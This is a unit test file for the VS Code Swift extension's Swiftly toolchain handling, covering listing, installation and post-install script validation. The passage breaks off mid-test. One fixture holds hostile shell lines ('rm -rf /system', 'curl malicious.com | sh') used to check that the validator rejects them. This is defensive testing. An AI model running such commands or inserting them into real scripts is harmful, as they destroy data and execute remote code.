//===----------------------------------------------------------------------===//
//
// This source file is part of the VS Code Swift open source project
//
// Copyright (c) 2025 the VS Code Swift project authors
// Licensed under Apache License v2.0
//
// See LICENSE.txt for license information
// See CONTRIBUTORS.txt for the list of VS Code Swift project authors
//
// SPDX-License-Identifier: Apache-2.0
//
//===----------------------------------------------------------------------===//
import { expect } from "chai";
import * as fs from "fs/promises";
import * as mockFS from "mock-fs";
import * as os from "os";
import { match } from "sinon";
import * as vscode from "vscode";

import { installSwiftlyToolchainVersion } from "@src/commands/installSwiftlyToolchain";
import * as SwiftOutputChannelModule from "@src/logging/SwiftOutputChannel";
import {
    Swiftly,
    handleMissingSwiftlyToolchain,
    parseSwiftlyMissingToolchainError,
} from "@src/toolchain/swiftly";
import * as utilities from "@src/utilities/utilities";

import { instance, mockGlobalModule, mockGlobalObject, mockGlobalValue } from "../../MockUtils";

suite("Swiftly Unit Tests", () => {
    const mockUtilities = mockGlobalModule(utilities);
    const mockedPlatform = mockGlobalValue(process, "platform");
    const mockedEnv = mockGlobalValue(process, "env");
    const mockSwiftOutputChannelModule = mockGlobalModule(SwiftOutputChannelModule);
    const mockOS = mockGlobalModule(os);

    setup(() => {
        mockUtilities.execFile.reset();
        mockUtilities.execFileStreamOutput.reset();
        mockSwiftOutputChannelModule.SwiftOutputChannel.reset();
        mockOS.tmpdir.reset();

        // Mock os.tmpdir() to return a valid temp directory path for Windows compatibility
        mockOS.tmpdir.returns(process.platform === "win32" ? "C:\\temp" : "/tmp");

        // Mock SwiftOutputChannel constructor to return a basic mock
        mockSwiftOutputChannelModule.SwiftOutputChannel.callsFake(
            () =>
                ({
                    show: () => {},
                    appendLine: () => {},
                    append: () => {},
                }) as any
        );

        mockedPlatform.setValue("darwin");
        mockedEnv.setValue({});
        mockFS({});
    });

    teardown(() => {
        mockFS.restore();
    });

    suite("list()", () => {
        test("should return toolchain names from list-available command for version 1.1.0", async () => {
            // Mock version check to return 1.1.0
            mockUtilities.execFile.withArgs("swiftly", ["--version"]).resolves({
                stdout: "1.1.0\n",
                stderr: "",
            });

            // Mock list-available command with JSON output
            const jsonOutput = {
                toolchains: [
                    {
                        inUse: false,
                        isDefault: false,
                        version: {
                            name: "xcode",
                            type: "system",
                        },
                    },
                    {
                        inUse: true,
                        isDefault: true,
                        version: {
                            major: 5,
                            minor: 9,
                            patch: 0,
                            name: "swift-5.9.0-RELEASE",
                            type: "stable",
                        },
                    },
                    {
                        inUse: false,
                        isDefault: false,
                        version: {
                            major: 5,
                            minor: 8,
                            patch: 0,
                            name: "swift-5.8.0-RELEASE",
                            type: "stable",
                        },
                    },
                    {
                        inUse: false,
                        isDefault: false,
                        version: {
                            major: 5,
                            minor: 10,
                            branch: "development",
                            date: "2023-10-15",
                            name: "swift-DEVELOPMENT-SNAPSHOT-2023-10-15-a",
                            type: "snapshot",
                        },
                    },
                ],
            };

            mockUtilities.execFile.withArgs("swiftly", ["list", "--format=json"]).resolves({
                stdout: JSON.stringify(jsonOutput),
                stderr: "",
            });

            const result = await Swiftly.list();

            expect(result).to.deep.equal([
                "xcode",
                "swift-5.9.0-RELEASE",
                "swift-5.8.0-RELEASE",
                "swift-DEVELOPMENT-SNAPSHOT-2023-10-15-a",
            ]);

            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", ["--version"]);
            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", [
                "list",
                "--format=json",
            ]);
        });

        test("should be able to parse future additions to the output and ignore unexpected types", async () => {
            // Mock version check to return 1.1.0
            mockUtilities.execFile.withArgs("swiftly", ["--version"]).resolves({
                stdout: "1.1.0\n",
                stderr: "",
            });

            // Mock list-available command with JSON output
            const jsonOutput = {
                toolchains: [
                    {
                        inUse: false,
                        isDefault: false,
                        version: {
                            name: "xcode",
                            type: "system",
                            newProp: 1, // Try adding a new property.
                        },
                        newProp: 1, // Try adding a new property.
                    },
                    {
                        inUse: false,
                        isDefault: false,
                        version: {
                            // Try adding an unexpected version type.
                            type: "something_else",
                        },
                        newProp: 1, // Try adding a new property.
                    },
                    {
                        inUse: true,
                        isDefault: true,
                        version: {
                            major: 5,
                            minor: 9,
                            patch: 0,
                            name: "swift-5.9.0-RELEASE",
                            type: "stable",
                            newProp: 1, // Try adding a new property.
                        },
                        newProp: 1, // Try adding a new property.
                    },
                    {
                        inUse: false,
                        isDefault: false,
                        version: {
                            major: 5,
                            minor: 8,
                            patch: 0,
                            name: "swift-5.8.0-RELEASE",
                            type: "stable",
                            newProp: 1, // Try adding a new property.
                        },
                        newProp: "", // Try adding a new property.
                    },
                    {
                        inUse: false,
                        isDefault: false,
                        version: {
                            major: 5,
                            minor: 10,
                            branch: "development",
                            date: "2023-10-15",
                            name: "swift-DEVELOPMENT-SNAPSHOT-2023-10-15-a",
                            type: "snapshot",
                            newProp: 1, // Try adding a new property.
                        },
                        newProp: 1, // Try adding a new property.
                    },
                ],
            };

            mockUtilities.execFile.withArgs("swiftly", ["list", "--format=json"]).resolves({
                stdout: JSON.stringify(jsonOutput),
                stderr: "",
            });

            const result = await Swiftly.list();

            expect(result).to.deep.equal([
                "xcode",
                "swift-5.9.0-RELEASE",
                "swift-5.8.0-RELEASE",
                "swift-DEVELOPMENT-SNAPSHOT-2023-10-15-a",
            ]);

            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", ["--version"]);
            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", [
                "list",
                "--format=json",
            ]);
        });

        test("should return empty array when platform is not supported", async () => {
            mockedPlatform.setValue("win32");

            const result = await Swiftly.list();

            expect(result).to.deep.equal([]);
            expect(mockUtilities.execFile).not.have.been.called;
        });

        test("should warn and return empty array when version is null", async () => {
            mockedPlatform.setValue("darwin");
            const mockLogger = {
                info: () => {},
                error: () => {},
                warn: () => {},
                debug: () => {},
            };

            // Mock version to return undefined (not installed)
            mockUtilities.execFile
                .withArgs("swiftly", ["--version"])
                .rejects(new Error("Command not found"));

            const result = await Swiftly.list(mockLogger as any);

            expect(result).to.deep.equal([]);
            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", ["--version"]);
        });

        test("list should handle errors and return empty array", async () => {
            mockedPlatform.setValue("darwin");
            const mockLogger = {
                info: () => {},
                error: () => {},
                warn: () => {},
                debug: () => {},
            };

            mockUtilities.execFile.withArgs("swiftly", ["--version"]).rejects(new Error("error"));

            const result = await Swiftly.list(instance(mockLogger));

            expect(result).to.deep.equal([]);
        });

        test("getToolchainInstallLegacy should return empty array when installedToolchains is not an array", async () => {
            mockedPlatform.setValue("darwin");
            mockedEnv.setValue({ SWIFTLY_HOME_DIR: "/test/swiftly" });

            // Mock getConfig to return invalid installedToolchains
            const mockConfig = {
                installedToolchains: "not-an-array",
            };

            mockFS.restore();
            mockFS({
                "/test/swiftly/config.json": JSON.stringify(mockConfig),
            });

            const result = await (Swiftly as any).listFromSwiftlyConfig();

            expect(result).to.deep.equal([]);
        });
    });

    suite("version", () => {
        test("should return undefined on unsupported platform", async () => {
            mockedPlatform.setValue("win32");

            const result = await Swiftly.version();

            expect(result).to.be.undefined;
            expect(mockUtilities.execFile).to.not.have.been.called;
        });

        test("should handle execFile errors", async () => {
            mockedPlatform.setValue("darwin");
            const mockLogger = {
                info: () => {},
                error: () => {},
                warn: () => {},
                debug: () => {},
            };

            mockUtilities.execFile
                .withArgs("swiftly", ["--version"])
                .rejects(new Error("Command not found"));

            const result = await Swiftly.version(mockLogger as any);

            expect(result).to.be.undefined;
            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", ["--version"]);
        });
    });

    suite("supportsJsonOutput", () => {
        test("should return false on unsupported platform", async () => {
            mockedPlatform.setValue("win32");

            const result = await (Swiftly as any).supportsJsonOutput();

            expect(result).to.be.false;
            expect(mockUtilities.execFile).to.not.have.been.called;
        });

        test("should handle execFile errors and log them", async () => {
            mockedPlatform.setValue("darwin");
            const mockLogger = {
                info: () => {},
                error: () => {},
                warn: () => {},
                debug: () => {},
            };

            mockUtilities.execFile
                .withArgs("swiftly", ["--version"])
                .rejects(new Error("Command failed"));

            const result = await (Swiftly as any).supportsJsonOutput(mockLogger);

            expect(result).to.be.false;
            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", ["--version"]);
        });
    });

    suite("installToolchain", () => {
        test("should throw error on unsupported platform", async () => {
            mockedPlatform.setValue("win32");

            await expect(
                Swiftly.installToolchain("6.0.0", undefined)
            ).to.eventually.be.rejectedWith("Swiftly is not supported on this platform");
            expect(mockUtilities.execFile).to.not.have.been.called;
        });

        test("should install toolchain successfully on macOS without progress callback", async () => {
            mockedPlatform.setValue("darwin");
            mockUtilities.execFileStreamOutput.withArgs("swiftly").resolves();

            const tmpDir = os.tmpdir();
            mockFS({
                [tmpDir]: {},
            });

            await Swiftly.installToolchain("6.0.0", undefined);

            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
                "swiftly",
                ["install", "6.0.0", "--use", "--assume-yes", "--post-install-file", match.string],
                match.any,
                match.any,
                match.any,
                match.any
            );
        });

        test("should attempt to install toolchain with progress callback on macOS", async () => {
            mockedPlatform.setValue("darwin");
            const progressCallback = () => {};

            mockUtilities.execFile.withArgs("mkfifo").resolves({ stdout: "", stderr: "" });
            mockUtilities.execFileStreamOutput.withArgs("swiftly", match.array).resolves();
            os.tmpdir();
            mockFS({});

            // This test verifies the method starts the installation process
            // The actual file stream handling is complex to mock properly
            try {
                await Swiftly.installToolchain("6.0.0", progressCallback);
            } catch (error) {
                // Expected due to mock-fs limitations with named pipes
                expect((error as Error).message).to.include("ENOENT");
            }

            expect(mockUtilities.execFile).to.have.been.calledWith("mkfifo", match.array);
        });

        test("should handle installation error properly", async () => {
            mockedPlatform.setValue("darwin");
            const installError = new Error("Installation failed");
            mockUtilities.execFileStreamOutput.withArgs("swiftly").rejects(installError);

            const tmpDir = os.tmpdir();
            mockFS({
                [tmpDir]: {},
            });

            await expect(
                Swiftly.installToolchain("6.0.0", undefined)
            ).to.eventually.be.rejectedWith("Installation failed");
        });
    });

    suite("listAvailable()", () => {
        test("should return empty array on unsupported platform", async () => {
            mockedPlatform.setValue("win32");

            const result = await Swiftly.listAvailable();

            expect(result).to.deep.equal([]);
        });

        test("should return empty array when Swiftly is not installed", async () => {
            mockedPlatform.setValue("darwin");
            mockUtilities.execFile
                .withArgs("swiftly", ["--version"])
                .rejects(new Error("Command not found"));

            const result = await Swiftly.listAvailable();

            expect(result).to.deep.equal([]);
        });

        test("should return empty array when Swiftly version doesn't support JSON output", async () => {
            mockedPlatform.setValue("darwin");
            mockUtilities.execFile.withArgs("swiftly", ["--version"]).resolves({
                stdout: "1.0.0\n",
                stderr: "",
            });

            const result = await Swiftly.listAvailable();

            expect(result).to.deep.equal([]);
        });

        test("should return available toolchains with installation status", async () => {
            mockedPlatform.setValue("darwin");

            mockUtilities.execFile.withArgs("swiftly", ["--version"]).resolves({
                stdout: "1.1.0\n",
                stderr: "",
            });

            const availableResponse = {
                toolchains: [
                    {
                        inUse: false,
                        installed: false,
                        isDefault: false,
                        version: {
                            type: "stable",
                            major: 6,
                            minor: 0,
                            patch: 0,
                            name: "6.0.0",
                        },
                    },
                    {
                        inUse: false,
                        installed: false,
                        isDefault: false,
                        version: {
                            type: "snapshot",
                            major: 6,
                            minor: 1,
                            branch: "main",
                            date: "2025-01-15",
                            name: "main-snapshot-2025-01-15",
                        },
                    },
                ],
            };

            mockUtilities.execFile
                .withArgs("swiftly", ["list-available", "--format=json"])
                .resolves({
                    stdout: JSON.stringify(availableResponse),
                    stderr: "",
                });

            const installedResponse = {
                toolchains: [
                    {
                        inUse: true,
                        isDefault: true,
                        version: {
                            type: "stable",
                            major: 6,
                            minor: 0,
                            patch: 0,
                            name: "6.0.0",
                        },
                    },
                ],
            };

            mockUtilities.execFile.withArgs("swiftly", ["list", "--format=json"]).resolves({
                stdout: JSON.stringify(installedResponse),
                stderr: "",
            });

            const result = await Swiftly.listAvailable();
            expect(result).to.deep.equal([
                {
                    inUse: false,
                    installed: false,
                    isDefault: false,
                    version: {
                        type: "stable",
                        major: 6,
                        minor: 0,
                        patch: 0,
                        name: "6.0.0",
                    },
                },
                {
                    inUse: false,
                    installed: false,
                    isDefault: false,
                    version: {
                        type: "snapshot",
                        major: 6,
                        minor: 1,
                        branch: "main",
                        date: "2025-01-15",
                        name: "main-snapshot-2025-01-15",
                    },
                },
            ]);
        });

        test("should be able to parse future additions to the output and ignore unexpected types", async () => {
            mockedPlatform.setValue("darwin");

            mockUtilities.execFile.withArgs("swiftly", ["--version"]).resolves({
                stdout: "1.1.0\n",
                stderr: "",
            });

            const availableResponse = {
                toolchains: [
                    {
                        inUse: false,
                        installed: false,
                        isDefault: false,
                        version: {
                            // Try adding an unexpected version type.
                            type: "something_else",
                        },
                        newProp: 1, // Try adding a new property.
                    },
                    {
                        inUse: false,
                        installed: false,
                        isDefault: false,
                        version: {
                            type: "stable",
                            major: 6,
                            minor: 0,
                            patch: 0,
                            name: "6.0.0",
                            newProp: 1, // Try adding a new property.
                        },
                        newProp: 1, // Try adding a new property.
                    },
                    {
                        inUse: false,
                        installed: false,
                        isDefault: false,
                        version: {
                            type: "snapshot",
                            major: 6,
                            minor: 1,
                            branch: "main",
                            date: "2025-01-15",
                            name: "main-snapshot-2025-01-15",
                            newProp: 1, // Try adding a new property.
                        },
                        newProp: 1, // Try adding a new property.
                    },
                ],
            };

            mockUtilities.execFile
                .withArgs("swiftly", ["list-available", "--format=json"])
                .resolves({
                    stdout: JSON.stringify(availableResponse),
                    stderr: "",
                });

            const result = await Swiftly.listAvailable();
            expect(result).to.deep.equal([
                {
                    inUse: false,
                    installed: false,
                    isDefault: false,
                    version: {
                        type: "stable",
                        major: 6,
                        minor: 0,
                        patch: 0,
                        name: "6.0.0",
                    },
                },
                {
                    inUse: false,
                    installed: false,
                    isDefault: false,
                    version: {
                        type: "snapshot",
                        major: 6,
                        minor: 1,
                        branch: "main",
                        date: "2025-01-15",
                        name: "main-snapshot-2025-01-15",
                    },
                },
            ]);
        });

        test("should handle errors when fetching available toolchains", async () => {
            mockedPlatform.setValue("darwin");
            mockUtilities.execFile.withArgs("swiftly", ["--version"]).resolves({
                stdout: "1.1.0\n",
                stderr: "",
            });
            mockUtilities.execFile
                .withArgs("swiftly", ["list-available", "--format=json"])
                .rejects(new Error("Network error"));
            const result = await Swiftly.listAvailable();
            expect(result).to.deep.equal([]);
        });

        test("should handle snapshot toolchains without major/minor fields", async () => {
            mockedPlatform.setValue("darwin");

            mockUtilities.execFile.withArgs("swiftly", ["--version"]).resolves({
                stdout: "1.1.0\n",
                stderr: "",
            });

            const snapshotResponse = {
                toolchains: [
                    {
                        inUse: false,
                        installed: false,
                        isDefault: false,
                        version: {
                            type: "snapshot",
                            branch: "main",
                            date: "2025-08-26",
                            name: "main-snapshot-2025-08-26",
                        },
                    },
                    {
                        inUse: false,
                        installed: true,
                        isDefault: false,
                        version: {
                            type: "snapshot",
                            branch: "main",
                            date: "2025-08-25",
                            name: "main-snapshot-2025-08-25",
                        },
                    },
                ],
            };

            mockUtilities.execFile
                .withArgs("swiftly", ["list-available", "--format=json", "main-snapshot"])
                .resolves({
                    stdout: JSON.stringify(snapshotResponse),
                    stderr: "",
                });

            const result = await Swiftly.listAvailable("main-snapshot");
            expect(result).to.deep.equal([
                {
                    inUse: false,
                    installed: false,
                    isDefault: false,
                    version: {
                        type: "snapshot",
                        branch: "main",
                        date: "2025-08-26",
                        name: "main-snapshot-2025-08-26",
                    },
                },
                {
                    inUse: false,
                    installed: true,
                    isDefault: false,
                    version: {
                        type: "snapshot",
                        branch: "main",
                        date: "2025-08-25",
                        name: "main-snapshot-2025-08-25",
                    },
                },
            ]);
        });
    });

    suite("Post-Install", () => {
        setup(() => {
            mockedPlatform.setValue("linux");
        });

        test("should call installToolchain with correct parameters", async () => {
            mockUtilities.execFileStreamOutput.withArgs("swiftly").resolves();
            mockUtilities.execFile.withArgs("mkfifo").resolves({ stdout: "", stderr: "" });

            await Swiftly.installToolchain("6.0.0");

            // Verify swiftly install was called with post-install file argument
            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
                "swiftly",
                ["install", "6.0.0", "--use", "--assume-yes", "--post-install-file", match.string],
                match.any,
                match.any,
                match.any,
                match.any
            );
        });

        test("should handle swiftly installation errors", async () => {
            const installError = new Error("Swiftly installation failed");
            mockUtilities.execFileStreamOutput.withArgs("swiftly").rejects(installError);
            mockUtilities.execFile.withArgs("mkfifo").resolves({ stdout: "", stderr: "" });

            await expect(Swiftly.installToolchain("6.0.0")).to.eventually.be.rejectedWith(
                "Swiftly installation failed"
            );
        });

        test("should handle mkfifo creation errors", async () => {
            const mkfifoError = new Error("Cannot create named pipe");
            mockUtilities.execFile.withArgs("mkfifo").rejects(mkfifoError);

            const progressCallback = () => {};

            await expect(
                Swiftly.installToolchain("6.0.0", progressCallback)
            ).to.eventually.be.rejectedWith("Cannot create named pipe");
        });

        test("should install without progress callback successfully", async () => {
            mockUtilities.execFileStreamOutput.withArgs("swiftly").resolves();

            await Swiftly.installToolchain("6.0.0");

            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
                "swiftly",
                match.array,
                match.any,
                match.any,
                match.any,
                match.any
            );
            // mkfifo should not be called when no progress callback is provided
            expect(mockUtilities.execFile).to.not.have.been.calledWith("mkfifo", match.array);
        });

        test("should create progress pipe when progress callback is provided", async () => {
            mockUtilities.execFileStreamOutput.withArgs("swiftly").resolves();
            mockUtilities.execFile.withArgs("mkfifo").resolves({ stdout: "", stderr: "" });

            const progressCallback = () => {};

            try {
                await Swiftly.installToolchain("6.0.0", progressCallback);
            } catch (error) {
                // Expected due to mock-fs limitations with named pipes in this test environment
            }

            expect(mockUtilities.execFile).to.have.been.calledWith("mkfifo", match.array);
            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
                "swiftly",
                match.array,
                match.any,
                match.any,
                match.any,
                match.any
            );
        });
    });

    suite("Post-Install File Handling", () => {
        const mockVscodeWindow = mockGlobalObject(vscode, "window");

        setup(() => {
            mockedPlatform.setValue("linux");
            mockVscodeWindow.showWarningMessage.reset();
            mockVscodeWindow.showInformationMessage.reset();
            mockVscodeWindow.showErrorMessage.reset();
            mockVscodeWindow.createOutputChannel.reset();

            // Mock createOutputChannel to return a basic output channel mock
            mockVscodeWindow.createOutputChannel.returns({
                show: () => {},
                appendLine: () => {},
                append: () => {},
                hide: () => {},
                dispose: () => {},
                name: "test-channel",
                replace: () => {},
                clear: () => {},
            } as any);
        });

        test("should execute post-install script when user confirms and script is valid", async () => {
            const validScript = `#!/bin/bash
apt-get -y install build-essential
apt-get -y install libncurses5-dev`;

            mockUtilities.execFileStreamOutput
                .withArgs("swiftly", [
                    "install",
                    "6.0.0",
                    "--use",
                    "--assume-yes",
                    "--post-install-file",
                    match.string,
                ])
                .callsFake(async (_command, args) => {
                    const postInstallPath = args[5];
                    await fs.writeFile(postInstallPath, validScript);
                    return;
                });
            mockUtilities.execFile
                .withArgs("chmod", match.array)
                .resolves({ stdout: "", stderr: "" });

            // Mock execFileStreamOutput for pkexec
            mockUtilities.execFileStreamOutput.withArgs("pkexec").resolves();

            // @ts-expect-error mocking vscode window methods makes type checking difficult
            mockVscodeWindow.showWarningMessage.resolves("Execute Script");

            await Swiftly.installToolchain("6.0.0");

            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
                "swiftly",
                match.array,
                match.any,
                match.any,
                match.any,
                match.any
            );
            expect(mockVscodeWindow.showWarningMessage).to.have.been.calledWith(
                match(
                    "Swift 6.0.0 installation requires additional system packages to be installed"
                )
            );
            expect(mockUtilities.execFile).to.have.been.calledWith("chmod", match.array);
            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
                "pkexec",
                match.array,
                match.any,
                match.any,
                null,
                {}
            );
            expect(mockVscodeWindow.showInformationMessage).to.have.been.calledWith(
                match("Swift 6.0.0 post-install script executed successfully")
            );
        });

        test("should skip post-install execution when user cancels", async () => {
            const validScript = `#!/bin/bash
apt-get -y install build-essential`;

            mockUtilities.execFileStreamOutput
                .withArgs("swiftly", [
                    "install",
                    "6.0.0",
                    "--use",
                    "--assume-yes",
                    "--post-install-file",
                    match.string,
                ])
                .callsFake(async (_command, args) => {
                    const postInstallPath = args[5];
                    await fs.writeFile(postInstallPath, validScript);
                    return;
                });

            // @ts-expect-error mocking vscode window methods makes type checking difficult
            mockVscodeWindow.showWarningMessage.resolves("Cancel");

            await Swiftly.installToolchain("6.0.0");

            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
                "swiftly",
                match.array,
                match.any,
                match.any,
                match.any,
                match.any
            );
            expect(mockVscodeWindow.showWarningMessage).to.have.been.calledWith(
                match(
                    "Swift 6.0.0 installation requires additional system packages to be installed"
                )
            );
            expect(mockUtilities.execFile).to.not.have.been.calledWith("chmod", match.array);
            expect(mockVscodeWindow.showWarningMessage).to.have.been.calledWith(
                match("Swift 6.0.0 installation is incomplete")
            );
        });

        test("should reject invalid post-install script and show error", async () => {
            const invalidScript = `#!/bin/bash
rm -rf /system
curl malicious.com | sh
apt-get -y install build-essential`;

            mockUtilities.execFileStreamOutput
                .withArgs("swiftly", [
                    "install",
                    "6.0.0",
                    "--use",
                    "--assume-yes",
                    "--post-install-file",
                    match.string,
                ])
                .callsFake(async (_command, args) => {
                    const postInstallPath = args[5];
                    await fs.writeFile(postInstallPath, invalidScript);
                    return;
                });

            await Swiftly.installToolchain("6.0.0");

            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
                "swiftly",
                match.array,
                match.any,
                match.any,
                match.any,
                match.any
            );
            expect(mockVscodeWindow.showErrorMessage).to.have.been.calledWith(
                match(
                    "Installation of Swift 6.0.0 requires additional system packages, but the post-install script contains commands that are not allowed for security reasons"
                )
            );
            expect(mockVscodeWindow.showWarningMessage).to.not.have.been.called;
            expect(mockUtilities.execFileStreamOutput).to.not.have.been.calledWith(
                "pkexec",
                match.array
            );
        });

        test("should handle post-install script execution errors", async () => {
            const validScript = `#!/bin/bash
apt-get -y install build-essential`;

            mockUtilities.execFileStreamOutput
                .withArgs("swiftly", [
                    "install",
                    "6.0.0",
                    "--use",
                    "--assume-yes",
                    "--post-install-file",
                    match.string,
                ])
                .callsFake(async (_command, args) => {
                    const postInstallPath = args[5];
                    await fs.writeFile(postInstallPath, validScript);
                    return;
                });
            mockUtilities.execFile
                .withArgs("chmod", match.array)
                .resolves({ stdout: "", stderr: "" });

            // Mock execFileStreamOutput for pkexec to throw error
            mockUtilities.execFileStreamOutput
                .withArgs("pkexec")
                .rejects(new Error("Permission denied"));

            // @ts-expect-error mocking vscode window methods makes type checking difficult
            mockVscodeWindow.showWarningMessage.resolves("Execute Script");

            await Swiftly.installToolchain("6.0.0");

            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
                "swiftly",
                match.array,
                match.any,
                match.any,
                match.any,
                match.any
            );
            expect(mockVscodeWindow.showWarningMessage).to.have.been.calledWith(
                match(
                    "Swift 6.0.0 installation requires additional system packages to be installed"
                )
            );
            expect(mockUtilities.execFile).to.have.been.calledWith("chmod", match.array);
            expect(mockVscodeWindow.showErrorMessage).to.have.been.calledWith(
                match("Failed to execute post-install script for Swift 6.0.0")
            );
        });

        test("should complete installation successfully when no post-install file exists", async () => {
            mockUtilities.execFileStreamOutput.withArgs("swiftly").resolves();

            await Swiftly.installToolchain("6.0.0");

            expect(mockVscodeWindow.showWarningMessage).to.not.have.been.called;
            expect(mockVscodeWindow.showErrorMessage).to.not.have.been.called;
            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
                "swiftly",
                match.array,
                match.any,
                match.any,
                match.any,
                match.any
            );
        });

        test("should validate yum-based post-install scripts", async () => {
            const yumScript = `#!/bin/bash
yum install gcc-c++
yum install ncurses-devel`;

            mockUtilities.execFileStreamOutput
                .withArgs("swiftly", [
                    "install",
                    "6.0.0",
                    "--use",
                    "--assume-yes",
                    "--post-install-file",
                    match.string,
                ])
                .callsFake(async (_command, args) => {
                    const postInstallPath = args[5];
                    await fs.writeFile(postInstallPath, yumScript);
                    return;
                });
            mockUtilities.execFile
                .withArgs("chmod", match.array)
                .resolves({ stdout: "", stderr: "" });

            // Mock execFileStreamOutput for pkexec
            mockUtilities.execFileStreamOutput.withArgs("pkexec").resolves();

            // @ts-expect-error mocking vscode window methods makes type checking difficult
            mockVscodeWindow.showWarningMessage.resolves("Execute Script");

            await Swiftly.installToolchain("6.0.0");

            expect(mockVscodeWindow.showWarningMessage).to.have.been.calledWith(
                match(
                    "Swift 6.0.0 installation requires additional system packages to be installed"
                )
            );
            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
                "pkexec",
                match.array,
                match.any,
                match.any,
                null,
                {}
            );
        });

        test("should handle malformed package manager commands in post-install script", async () => {
            const malformedScript = `#!/bin/bash
apt-get install --unsafe-flag malicious-package
yum remove important-system-package`;

            mockUtilities.execFileStreamOutput
                .withArgs("swiftly", [
                    "install",
                    "6.0.0",
                    "--use",
                    "--assume-yes",
                    "--post-install-file",
                    match.string,
                ])
                .callsFake(async (_command, args) => {
                    const postInstallPath = args[5];
                    await fs.writeFile(postInstallPath, malformedScript);
                    return;
                });

            await Swiftly.installToolchain("6.0.0");

            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
                "swiftly",
                match.array,
                match.any,
                match.any,
                match.any,
                match.any
            );
            expect(mockVscodeWindow.showErrorMessage).to.have.been.calledWith(
                match(
                    "Installation of Swift 6.0.0 requires additional system packages, but the post-install script contains commands that are not allowed for security reasons"
                )
            );
        });

        test("should ignore comments and empty lines in post-install script", async () => {
            const scriptWithComments = `#!/bin/bash
# This is a comment

apt-get -y install libncurses5-dev
# Another comment

`;

            mockUtilities.execFileStreamOutput
                .withArgs("swiftly", [
                    "install",
                    "6.0.0",
                    "--use",
                    "--assume-yes",
                    "--post-install-file",
                    match.string,
                ])
                .callsFake(async (_command, args) => {
                    const postInstallPath = args[5];
                    await fs.writeFile(postInstallPath, scriptWithComments);
                    return;
                });
            mockUtilities.execFile
                .withArgs("chmod", match.array)
                .resolves({ stdout: "", stderr: "" });

            // Mock execFileStreamOutput for pkexec
            mockUtilities.execFileStreamOutput.withArgs("pkexec").resolves();

            // @ts-expect-error mocking vscode window methods makes type checking difficult
            mockVscodeWindow.showWarningMessage.resolves("Execute Script");

            await Swiftly.installToolchain("6.0.0");

            expect(mockVscodeWindow.showWarningMessage).to.have.been.calledWith(
                match(
                    "Swift 6.0.0 installation requires additional system packages to be installed"
                )
            );
            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
                "pkexec",
                match.array,
                match.any,
                match.any,
                null,
                {}
            );
        });

        test("should skip post-install handling on macOS", async () => {
            mockedPlatform.setValue("darwin");
            mockUtilities.execFileStreamOutput.withArgs("swiftly").resolves();

            await Swiftly.installToolchain("6.0.0");

            expect(mockVscodeWindow.showWarningMessage).to.not.have.been.called;
            expect(mockUtilities.execFileStreamOutput).to.not.have.been.calledWith(
                "pkexec",
                match.array
            );
        });
    });

    suite("Missing Toolchain Handling", () => {
        test("parseSwiftlyMissingToolchainError parses version correctly", () => {
            const stderr =
                "The swift version file uses toolchain version 6.1.2, but it doesn't match any of the installed toolchains. You can install the toolchain with `swiftly install`.";
            const result = parseSwiftlyMissingToolchainError(stderr);
            expect(result?.version).to.equal("6.1.2");
            expect(result?.originalError).to.equal(stderr);
        });

        test("parseSwiftlyMissingToolchainError returns undefined for other errors", () => {
            const stderr = "Some other error message";
            const result = parseSwiftlyMissingToolchainError(stderr);
            expect(result).to.be.undefined;
        });

        test("parseSwiftlyMissingToolchainError handles snapshot versions", () => {
            const stderr =
                "uses toolchain version 6.1-snapshot-2024-12-01, but it doesn't match any of the installed toolchains";
            const result = parseSwiftlyMissingToolchainError(stderr);
            expect(result?.version).to.equal("6.1-snapshot-2024-12-01");
        });

        test("parseSwiftlyMissingToolchainError handles versions with hyphens", () => {
            const stderr =
                "uses toolchain version 6.0-dev, but it doesn't match any of the installed toolchains";
            const result = parseSwiftlyMissingToolchainError(stderr);
            expect(result?.version).to.equal("6.0-dev");
        });
    });

    suite("handleMissingSwiftlyToolchain", () => {
        const mockWindow = mockGlobalObject(vscode, "window");
        const mockedUtilities = mockGlobalModule(utilities);
        const mockSwiftlyInstallToolchain = mockGlobalValue(Swiftly, "installToolchain");

        test("handleMissingSwiftlyToolchain returns false when user declines installation", async () => {
            mockWindow.showWarningMessage.resolves(undefined); // User cancels/declines
            const result = await handleMissingSwiftlyToolchain("6.1.2");
            expect(result).to.be.false;
        });

        test("handleMissingSwiftlyToolchain returns true when user accepts and installation succeeds", async () => {
            // User accepts the installation
            mockWindow.showWarningMessage.resolves("Install Toolchain" as any);

            // Mock successful installation with progress
            mockWindow.withProgress.callsFake(async (_options, task) => {
                const mockProgress = { report: () => {} };
                const mockToken = {
                    isCancellationRequested: false,
                    onCancellationRequested: () => ({ dispose: () => {} }),
                };
                await task(mockProgress, mockToken);
                return true;
            });

            mockSwiftlyInstallToolchain.setValue(() => Promise.resolve(void 0));

            // Mock the installSwiftlyToolchainVersion to succeed
            mockedUtilities.execFile
                .withArgs("swiftly", match.any)
                .resolves({ stdout: "", stderr: "" });

            const result = await handleMissingSwiftlyToolchain("6.1.2");
            expect(result).to.be.true;
        });
    });

    suite("Toolchain Installation Cancellation", () => {
        const mockWindow = mockGlobalObject(vscode, "window");

        test("installToolchain should handle cancellation during progress", async () => {
            mockedPlatform.setValue("darwin");

            // Mock a cancellation token that gets cancelled
            const mockToken = {
                isCancellationRequested: true,
                onCancellationRequested: () => ({ dispose: () => {} }),
            };

            // Mock mkfifo to succeed
